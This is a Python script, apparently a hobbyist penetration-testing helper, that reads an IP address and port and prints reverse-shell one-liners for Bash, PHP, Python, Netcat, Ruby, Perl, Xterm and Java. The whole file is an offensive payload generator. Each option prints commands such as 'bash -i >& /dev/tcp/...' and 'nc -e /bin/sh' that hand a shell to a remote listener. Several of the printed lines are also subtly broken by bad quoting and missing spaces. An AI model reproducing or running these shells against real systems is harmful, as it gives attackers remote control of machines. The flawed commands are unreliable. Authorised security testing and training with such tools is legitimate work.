#!/usr/bin/python3

import ipaddress
import socket
from colorama import Fore


# functions & Menú
def shell_menu():
    print('1. Reverse shell Bash')
    print('2. Reverse shell Php')
    print('3. Reverse shell Python')
    print('4. Reverse shell Netcat')
    print('5. Reverse shell Ruby')
    print('6. Reverse shell Perl')
    print('7. Reverse shell Xterm')
    print('8. Reverse shell Java')
    print('9. Show all reverse shell')
    print('10. Quit')


def check_ip_and_port():
    while True:
        ip = input("Enter an IP address: ")
        port = input("Enter a Port: ")
        try:
            socket.inet_aton(ip)
            if 0 < int(port) < 65535:
                return ip, port
        except (socket.error, ValueError):
            pass
        print("Invalid IP address or Port. Try again.")

# > bash
def bash():
    print('You selected reverse shell Bash')
    ip,port = check_ip_and_port()
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)
    print('bash -i >& /dev/tcp/'+ ip +'/' + port + ' 0>&1')
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)

# > php
def php():
     print('You selected reverse shell php')
     ip,port = check_ip_and_port()
     print(Fore.GREEN +'--------------------------------'+ Fore.RESET)
     print("php -r '$sock=fsockopen("+ip +","+ port +");exec("'/bin/sh' '-i <&3 >&3 2>&3'");' ")
     print(Fore.GREEN +'--------------------------------'+ Fore.RESET)

# > python
def python():
    print('You selected reverse shell python')
    ip,port = check_ip_and_port()
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)
    print("python - c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ip+","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']));'  ")
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)

# > netcat
def netcat():
    print('You selected reverse shell netcat')
    ip,port = check_ip_and_port()
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)
    print ("nc -e /bin/sh "+ ip +" "+ port)
    print ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" + ip +" " + port +">/tmp/f ")
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)

# > Ruby
def ruby():
    print('You selected reverse shell ruby')
    ip,port = check_ip_and_port()
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)
    print("ruby -rsocket -e'f=TCPSocket.open("+ ip +","+ port +").to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'  ")
    print(Fore.GREEN +'--------------------------------'+ Fore.RESET)

# > perl
def perl():
    print('You selected reverse shell perl')
    ip,port = check_ip_and_port()
    print(Fore.GREEN +'-----------------------------------'+ Fore.RESET)
    print ("perl -e 'use Socket;$i="+ ip +";$p="+ port +";socket(S,PF_INET,SOCK_STREAM,getprotobyname("'tcp'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'")
    print(Fore.GREEN +'-----------------------------------'+ Fore.RESET)

# > xterm
def xterm():
    print('You selected reverse shell xterm')
    ip,port = check_ip_and_port()
    print(Fore.GREEN +'-----------------------------------'+ Fore.RESET)
    print('xterm -display'+ ip +':'+ port)
    print(Fore.GREEN +'-----------------------------------'+ Fore.RESET)

# > Java
def java():
    print('You selected reverse shell java')
    ip,port = check_ip_and_port()
    print(Fore.GREEN +'-----------------------------------'+ Fore.RESET)
    print('r = Runtime.getRuntime()')
    print('p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'+ ip +'/'+ port +';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])')
    print('p.waitFor()')
    print(Fore.GREEN +'-----------------------------------'+ Fore.RESET)


def showall():
    print('You selected all reverse shells')
    ip,port = check_ip_and_port()

    #bash -->
    print(Fore.GREEN +'-------------  Bash   -------------'+ Fore.RESET)
    print('bash -i >& /dev/tcp/'+ ip +'/' + port + ' 0>&1')
    #php -->
    print(Fore.GREEN +'-------------  Php   --------------'+ Fore.RESET)
    print("php -r '$sock=fsockopen("+ip +","+ port +");exec("'/bin/sh' '-i <&3 >&3 2>&3'");' ")
    
    #python -->
    print(Fore.GREEN +'-------------  Python  ------------'+ Fore.RESET)
    print("python - c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ip+","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']));'  ")
    
    #netcat -->
    print(Fore.GREEN +'-------------  NetCat  ------------'+ Fore.RESET)
    print ("nc -e /bin/sh "+ ip + port)
    print ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" + ip +" " + port +">/tmp/f ")
    
    #ruby -->
    print(Fore.GREEN +'-------------  Ruby    ------------'+ Fore.RESET)
    print("ruby -rsocket -e'f=TCPSocket.open("+ ip +","+ port +").to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'  ")
    
    #perl -->
    print(Fore.GREEN +'-------------  Perl    ------------'+ Fore.RESET)
    print ("perl -e 'use Socket;$i="+ ip +";$p="+ port +";socket(S,PF_INET,SOCK_STREAM,getprotobyname("'tcp'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'")

    #xterm -->
    print(Fore.GREEN +'-------------  Xterm   ------------'+ Fore.RESET)
    print('xterm -display'+ ip +':' + port)

    #java -->
    print(Fore.GREEN +'-------------  Java    ------------'+ Fore.RESET)
    print('r = Runtime.getRuntime()')
    print('p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'+ ip +'/'+ port +';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])')
    print('p.waitFor()')
    print(Fore.GREEN +'-----------------------------------'+ Fore.RESET)


# While loop

while True:
    shell_menu()
    print(Fore.RED + '----------------------'+ Fore.RESET)
    print('Developed By S.x1v4n')
    print(Fore.RED + '----------------------'+ Fore.RESET)
    choice = input('Enter your choice [1-10]: ')
    
    if choice   == '1':
        bash()
    elif choice == '2':
        php()
    elif choice == '3':
        python()
    elif choice == '4':
        netcat()
    elif choice == '5':
        ruby()
    elif choice == '6':
        perl()
    elif choice == '7':
        xterm()
    elif choice == '8':
        java()
    elif choice == '9':
        showall()
    elif choice == '10':
        print('Quitting...')
        break
    else:
        print('Invalid option, try again.')
